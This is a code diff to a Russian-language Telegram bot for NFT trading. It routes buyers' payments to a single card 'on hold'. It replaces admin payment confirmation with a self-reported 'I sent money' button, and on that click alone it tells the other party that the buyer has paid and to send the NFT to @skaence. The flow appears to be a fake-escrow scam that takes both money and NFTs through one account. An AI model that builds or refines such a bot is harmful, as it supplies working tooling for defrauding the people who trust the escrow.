@@ -6,7 +6,11 @@ from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import (
+    Message, CallbackQuery, 
+    InlineKeyboardMarkup, InlineKeyboardButton,
+    ReplyKeyboardMarkup, KeyboardButton
+)
 
 # ================== НАСТРОЙКИ ==================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -40,7 +44,14 @@ async def start(message: Message, state: FSMContext):
     if message.from_user.username:
         registered_users[message.from_user.username.lower()] = message.from_user.id
 
-    kb = InlineKeyboardMarkup(inline_keyboard=[
+    # Постоянная кнопка Техподдержка
+    reply_kb = ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="Техподдержка")]],
+        resize_keyboard=True
+    )
+
+    # Кнопки выбора
+    inline_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🛒 Продать NFT", callback_data="role_sell")],
         [InlineKeyboardButton(text="💰 Купить NFT", callback_data="role_buy")]
     ])
@@ -48,9 +59,18 @@ async def start(message: Message, state: FSMContext):
     await message.answer(
         "<b>Добро пожаловать!</b>\n\n"
         "Выбери, что хочешь сделать:",
-        reply_markup=kb,
+        reply_markup=inline_kb,
         parse_mode="HTML"
     )
+    await message.answer(
+        "Кнопка техподдержки всегда доступна внизу ↓",
+        reply_markup=reply_kb
+    )
+
+
+@dp.message(F.text == "Техподдержка")
+async def support(message: Message):
+    await message.answer("Техподдержка: @skaence")
 
 
 @dp.callback_query(F.data.in_({"role_sell", "role_buy"}))
@@ -144,7 +164,6 @@ async def confirm_yes(callback: CallbackQuery, state: FSMContext):
         f"Цена: <b>{data['price']}</b>"
     )
 
-    # В callback сохраняем роль и id отправителя
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="✅ Согласиться", callback_data=f"accept:{user.id}:{role}"),
@@ -152,29 +171,29 @@ async def confirm_yes(callback: CallbackQuery, state: FSMContext):
         ]
     ])
 
-    # Всегда отправляем админу
+    # Всегда отправляем тебе
     await bot.send_message(ADMIN_ID, deal_text, reply_markup=kb, parse_mode="HTML")
 
     # Отправляем второй стороне
     other_id = registered_users.get(other_username_clean)
-    status_parts = ["Заявка отправлена администратору."]
+    status = ["Заявка отправлена."]
 
     if other_id:
         try:
             await bot.send_message(other_id, deal_text, reply_markup=kb, parse_mode="HTML")
             if role == "sell":
-                status_parts.append("Заявка также отправлена покупателю.")
+                status.append("Также отправлена покупателю.")
             else:
-                status_parts.append("Заявка также отправлена продавцу.")
+                status.append("Также отправлена продавцу.")
         except Exception:
-            status_parts.append("Вторая сторона недоступна.")
+            status.append("Вторая сторона недоступна.")
     else:
         if role == "sell":
-            status_parts.append("Покупатель ещё не запускал бота.")
+            status.append("Покупатель ещё не запускал бота.")
         else:
-            status_parts.append("Продавец ещё не запускал бота.")
+            status.append("Продавец ещё не запускал бота.")
 
-    await callback.message.edit_text("✅ " + "\n".join(status_parts))
+    await callback.message.edit_text("✅ " + " ".join(status))
     await state.clear()
     await callback.answer()
 
@@ -190,47 +209,51 @@ async def confirm_no(callback: CallbackQuery, state: FSMContext):
 async def accept_deal(callback: CallbackQuery):
     parts = callback.data.split(":")
     sender_id = int(parts[1])
-    role = parts[2] if len(parts) > 2 else "sell"
 
-    # Сообщение с реквизитами для оплаты
     payment_text = (
         f"<b>Заявка принята!</b>\n\n"
         f"Для оплаты переведите сумму на карту:\n\n"
         f"<code>{CARD_NUMBER}</code>\n\n"
-        f"⚠️ Деньги будут на удержании и отправятся продавцу только в течение 7 дней после подтверждения.\n\n"
-        f"После перевода ожидайте подтверждения."
+        f"⚠️ Деньги будут на удержании и будут отправлены только в течение 7 дней.\n\n"
+        f"После перевода нажмите кнопку ниже."
     )
 
-    await bot.send_message(sender_id, payment_text, parse_mode="HTML")
-
-    # Кнопка подтверждения оплаты (для того, кто принял, или админа)
-    new_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"confirm_pay:{sender_id}")]
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ Я отправил деньги", callback_data=f"paid:{sender_id}")]
     ])
 
+    await bot.send_message(sender_id, payment_text, reply_markup=kb, parse_mode="HTML")
+
     await callback.message.edit_text(
-        callback.message.text + "\n\n✅ <b>Ты согласился</b>\n\nНажми кнопку, когда оплата поступит:",
-        reply_markup=new_kb,
+        callback.message.text + "\n\n✅ <b>Ты согласился</b>",
         parse_mode="HTML"
     )
     await callback.answer("Реквизиты отправлены")
 
 
-@dp.callback_query(F.data.startswith("confirm_pay:"))
-async def confirm_payment(callback: CallbackQuery):
+@dp.callback_query(F.data.startswith("paid:"))
+async def user_paid(callback: CallbackQuery):
     sender_id = int(callback.data.split(":")[1])
 
     await bot.send_message(
         sender_id,
-        "Оплата подтверждена.\n\n"
-        "Деньги находятся на удержании и будут отправлены в течение 7 дней."
+        "Покупатель оплатил заказ.\n\n"
+        "Отправьте NFT на @skaence на удержание.\n\n"
+        "В течение 7 дней вы получите деньги."
+    )
+
+    await bot.send_message(
+        ADMIN_ID,
+        f"Пользователь (ID: <code>{sender_id}</code>) нажал «Я отправил деньги».\n"
+        f"Ожидается отправка NFT на @skaence.",
+        parse_mode="HTML"
     )
 
     await callback.message.edit_text(
-        callback.message.text + "\n\n💰 <b>Оплата подтверждена</b>",
+        callback.message.text + "\n\n✅ <b>Отмечено: деньги отправлены</b>",
         parse_mode="HTML"
     )
-    await callback.answer("Подтверждение отправлено")
+    await callback.answer("Готово")
 
 
 @dp.callback_query(F.data.startswith("reject:"))
